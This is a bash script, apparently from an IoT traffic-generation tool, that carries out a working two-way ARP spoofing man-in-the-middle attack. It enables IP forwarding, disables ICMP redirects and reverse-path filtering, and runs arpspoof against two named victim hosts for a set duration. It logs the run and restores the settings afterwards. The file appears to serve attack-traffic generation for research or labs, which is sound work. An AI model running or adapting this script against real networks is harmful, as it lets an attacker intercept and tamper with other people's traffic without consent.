#!/usr/bin/env bash
set -euo pipefail

: "${TARGET_A:?TARGET_A (victim 1) is required}"
: "${TARGET_B:?TARGET_B (victim 2) is required}"
: "${DURATION:?DURATION (seconds) is required}"

RUN_ID="${RUN_ID:-run_unknown}"
OUT_DIR="${OUT_DIR:-runs/${RUN_ID}/arp_spoof}"
NETWORK_INTERFACE="${NETWORK_INTERFACE:-}"

mkdir -p "$OUT_DIR"

echo "[arp_spoof] TARGET_A (Victim 1): ${TARGET_A}"
echo "[arp_spoof] TARGET_B (Victim 2): ${TARGET_B}"
echo "[arp_spoof] DURATION: ${DURATION}s"
echo "[arp_spoof] OUT_DIR: ${OUT_DIR}"

if ! command -v arpspoof &>/dev/null; then
    echo "[arp_spoof] ERROR: arpspoof not found in PATH"
    echo "[arp_spoof] Install: apt install dsniff or brew install dsniff"
    exit 1
fi

if [[ "${EUID:-$(id -u)}" -ne 0 ]]; then
    echo "[arp_spoof] ERROR: arpspoof requires root privileges"
    echo "[arp_spoof] Run with: sudo iottrafficgen ..."
    exit 1
fi

if [[ -z "$NETWORK_INTERFACE" ]]; then
    NETWORK_INTERFACE=$(ip route get "$TARGET_A" 2>/dev/null | grep -oP '(?<=dev )\S+' || echo "")
    if [[ -z "$NETWORK_INTERFACE" ]]; then
        echo "[arp_spoof] ERROR: Could not detect network interface"
        echo "[arp_spoof] Specify with NETWORK_INTERFACE env variable"
        exit 1
    fi
fi

echo "[arp_spoof] Network interface: ${NETWORK_INTERFACE}"

ORIGINAL_IPFWD=$(sysctl -n net.ipv4.ip_forward 2>/dev/null || echo "0")
ORIGINAL_SEND_REDIRECTS=$(sysctl -n net.ipv4.conf.all.send_redirects 2>/dev/null || echo "1")
ORIGINAL_RP_FILTER=$(sysctl -n net.ipv4.conf.all.rp_filter 2>/dev/null || echo "1")

cleanup() {
    echo "[arp_spoof] Cleaning up..."
    
    pkill -P $$ arpspoof 2>/dev/null || true
    
    echo "[arp_spoof] Restoring system settings..."
    sysctl -w net.ipv4.ip_forward="$ORIGINAL_IPFWD" >/dev/null 2>&1 || true
    sysctl -w net.ipv4.conf.all.send_redirects="$ORIGINAL_SEND_REDIRECTS" >/dev/null 2>&1 || true
    sysctl -w net.ipv4.conf.all.rp_filter="$ORIGINAL_RP_FILTER" >/dev/null 2>&1 || true
    
    if command -v arping &>/dev/null; then
        echo "[arp_spoof] Sending gratuitous ARP to restore victim tables..."
        arping -U -c 3 "$TARGET_A" 2>/dev/null || true
        arping -U -c 3 "$TARGET_B" 2>/dev/null || true
    fi
    
    echo "[arp_spoof] Cleanup completed"
}

trap cleanup EXIT INT TERM

echo "[arp_spoof] Configuring system for MITM..."
sysctl -w net.ipv4.ip_forward=1 >/dev/null 2>&1 || echo "[arp_spoof] WARNING: Could not enable IP forwarding"
sysctl -w net.ipv4.conf.all.send_redirects=0 >/dev/null 2>&1 || true
sysctl -w net.ipv4.conf.all.rp_filter=0 >/dev/null 2>&1 || true

OUTPUT_FILE="${OUT_DIR}/arpspoof_output.txt"

echo "[arp_spoof] Starting ARP spoofing MITM attack..."
echo "[arp_spoof] Poisoning: $TARGET_A <--> $TARGET_B"
echo "[arp_spoof] Duration: ${DURATION}s"
echo "[arp_spoof] Press Ctrl+C to stop early"

{
    echo "=== ARP Spoofing Attack Log ==="
    echo "Start time: $(date)"
    echo "Target A: $TARGET_A"
    echo "Target B: $TARGET_B"
    echo "Interface: $NETWORK_INTERFACE"
    echo "Duration: ${DURATION}s"
    echo ""
} > "$OUTPUT_FILE"

arpspoof -i "$NETWORK_INTERFACE" -t "$TARGET_A" "$TARGET_B" >> "$OUTPUT_FILE" 2>&1 &
ARPSPOOF_PID_A=$!

arpspoof -i "$NETWORK_INTERFACE" -t "$TARGET_B" "$TARGET_A" >> "$OUTPUT_FILE" 2>&1 &
ARPSPOOF_PID_B=$!

echo "[arp_spoof] arpspoof PIDs: [$ARPSPOOF_PID_A, $ARPSPOOF_PID_B]"

sleep "$DURATION"

echo "[arp_spoof] Duration completed, stopping attack..."

kill $ARPSPOOF_PID_A $ARPSPOOF_PID_B 2>/dev/null || true

{
    echo ""
    echo "End time: $(date)"
    echo "Attack completed successfully"
} >> "$OUTPUT_FILE"

echo "[arp_spoof] Output saved to: $OUTPUT_FILE"
echo "[arp_spoof] Completed"
exit 0
